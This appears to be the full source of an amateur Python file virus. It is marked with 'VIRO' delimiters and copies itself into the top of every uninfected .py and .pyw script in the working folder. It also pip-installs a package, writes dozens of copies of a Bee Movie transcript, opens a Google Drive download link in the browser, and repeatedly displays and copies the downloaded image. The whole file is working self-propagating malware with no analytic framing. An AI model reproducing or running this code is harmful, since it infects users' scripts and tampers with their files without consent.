### START OF VIRO: Mwu$WaL&Ck#K_8h=P_5^hwW!FH&M ###

from subprocess import Popen

with open('requirements.txt', 'w') as f:
    f.write("Pillow")

Popen("pip install -r requirements.txt")


import sys, glob, os, webbrowser, time
from PIL import Image

code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

virus_area = False
for line in lines:
    if line == '### START OF VIRO: Mwu$WaL&Ck#K_8h=P_5^hwW!FH&M ###\n':
        virus_area = True
    if virus_area:
        code.append(line)
    if line == '### END OF VIRO: Mwu$WaL&Ck#K_8h=P_5^hwW!FH&M ###\n':
        break

python_scripts = glob.glob('*.py') + glob.glob('*.pyw')

for script in python_scripts:
    with open(script, 'r') as f:
        script_code = f.readlines()

    infected = False
    for line in script_code:
        if line == '### START OF VIRO: Mwu$WaL&Ck#K_8h=P_5^hwW!FH&M ###\n':
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(code)
        final_code.extend('\n')
        final_code.extend(script_code)

        with open(script, 'w') as f:
            f.writelines(final_code)


# malicion codeeeeeee 

with open('beemove.txt', 'w') as f:
    f.write("""Bee Movie Script - Dialogue Transcript

  
    According to all known laws
    of aviation,

  
    there is no way a bee
    should be able to fly.

    
    Its wings are too small to get
    its fat little body off the ground.

    
    The bee, of course, flies anyway

    
    because bees don't care
    what humans think is impossible.

    
    Yellow, black. Yellow, black.
    Yellow, black. Yellow, black.

    
    Ooh, black and yellow!
    Let's shake it up a little.

    
    Barry! Breakfast is ready!

    
    Ooming!

    
    Hang on a second.

    
    Hello?

    
    - Barry?
    - Adam?

    
    - Oan you believe this is happening?
    - I can't. I'll pick you up.

    
    Looking sharp.

    
    Use the stairs. Your father
    paid good money for those.

    
    Sorry. I'm excited.

    
    Here's the graduate.
    We're very proud of you, son.

    
    A perfect report card, all B's.

    
    Very proud.

    
    Ma! I got a thing going here.

    
    - You got lint on your fuzz.
    - Ow! That's me!

    
    - Wave to us! We'll be in row 118,000.
    - Bye!

    
    Barry, I told you,
    stop flying in the house!

    
    - Hey, Adam.
    - Hey, Barry.

    
    - Is that fuzz gel?
    - A little. Special day, graduation.

    
    Never thought I'd make it.

    
    Three days grade school,
    three days high school.

    
    Those were awkward.

    
    Three days college. I'm glad I took
    a day and hitchhiked around the hive.

    
    You did come back different.

    
    - Hi, Barry.
    - Artie, growing a mustache? Looks good.

    
    - Hear about Frankie?
    - Yeah.

    
    - You going to the funeral?
    - No, I'm not going.

    
    Everybody knows,
    sting someone, you die.

    
    Don't waste it on a squirrel.
    Such a hothead.

    
    I guess he could have
    just gotten out of the way.

    
    I love this incorporating
    an amusement park into our day.

    
    That's why we don't need vacations.""")

with open('beemove.txt', 'r')as f:
    allScript = f.read()

with open('beemove1.txt', 'w') as f:
    f.write(allScript)

with open('beemove2.txt', 'w') as f:
    f.write(allScript)
with open('beemove3.txt', 'w') as f:
    f.write(allScript)
with open('beemove4.txt', 'w') as f:
    f.write(allScript)
with open('beemove5.txt', 'w') as f:
    f.write(allScript)
with open('beemove6.txt', 'w') as f:
    f.write(allScript)
with open('beemove7.txt', 'w') as f:
    f.write(allScript)
with open('beemove8.txt', 'w') as f:
    f.write(allScript)
with open('beemove9.txt', 'w') as f:
    f.write(allScript)
with open('beemove10.txt', 'w') as f:
    f.write(allScript)
with open('beemove11.txt', 'w') as f:
    f.write(allScript)
with open('beemove12.txt', 'w') as f:
    f.write(allScript)
with open('beemove13.txt', 'w') as f:
    f.write(allScript)
with open('beemove14.txt', 'w') as f:
    f.write(allScript)
with open('beemove15.txt', 'w') as f:
    f.write(allScript)
with open('beemove16.txt', 'w') as f:
    f.write(allScript)
with open('beemove17.txt', 'w') as f:
    f.write(allScript)
with open('beemove18.txt', 'w') as f:
    f.write(allScript)
with open('beemove19.txt', 'w') as f:
    f.write(allScript)
with open('beemove20.txt', 'w') as f:
    f.write(allScript)
with open('beemove20.txt', 'w') as f:
    f.write(allScript)
with open('beemove21.txt', 'w') as f:
    f.write(allScript)
with open('beemove22.txt', 'w') as f:
    f.write(allScript)
with open('beemove23.txt', 'w') as f:
    f.write(allScript)
with open('beemove24.txt', 'w') as f:
    f.write(allScript)
with open('beemove25.txt', 'w') as f:
    f.write(allScript)
with open('beemove26.txt', 'w') as f:
    f.write(allScript)
with open('beemove27.txt', 'w') as f:
    f.write(allScript)
with open('beemove28.txt', 'w') as f:
    f.write(allScript)
with open('beemove29.txt', 'w') as f:
    f.write(allScript)
with open('beemove30.txt', 'w') as f:
    f.write(allScript)


time.sleep(4)

webbrowser.open("https://drive.google.com/uc?export=download&id=1lynEXphUjo5E47xbL9dp1PU5xd2ICo2I")

time.sleep(7)

real_path = os.path.dirname(os.path.realpath(__file__))

username = os.getlogin()

os.chdir(f"C:/Users/{username}/Downloads")

img = Image.open("samantha1.png")

os.chdir(real_path)


for i in range(5):
    img.show()


for num in range(5):
    img.save("samantha" + str(num + 1) + ".png")







### END OF VIRO: Mwu$WaL&Ck#K_8h=P_5^hwW!FH&M ###

